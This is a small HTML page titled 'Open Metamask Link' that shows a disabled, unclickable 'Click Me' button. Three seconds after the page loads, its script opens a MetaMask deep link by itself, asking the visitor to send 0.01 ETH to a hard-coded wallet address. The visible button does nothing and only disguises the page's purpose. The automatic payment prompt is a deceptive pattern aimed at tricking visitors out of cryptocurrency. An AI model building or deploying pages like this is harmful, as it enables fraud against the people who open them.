<!DOCTYPE html>
<html>
<head>
    <title>Open Metamask Link</title>
    <style>
        /* Style for the static button */
        .metamask-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #007BFF;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            pointer-events: none; /* Disable click events */
        }
    </style>
</head>
<body>

    <button class="metamask-button" id="metamask-button">Click Me</button>

    <script>
        // Function to open Metamask link
        function openMetamaskLink() {
            window.open('https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16');
        }

        // Automatically open the Metamask link after 3 seconds
        setTimeout(openMetamaskLink, 3000); // 3000 milliseconds = 3 seconds

        // Disable the button so it's not clickable
        document.getElementById('metamask-button').disabled = true;
    </script>

</body>
</html>
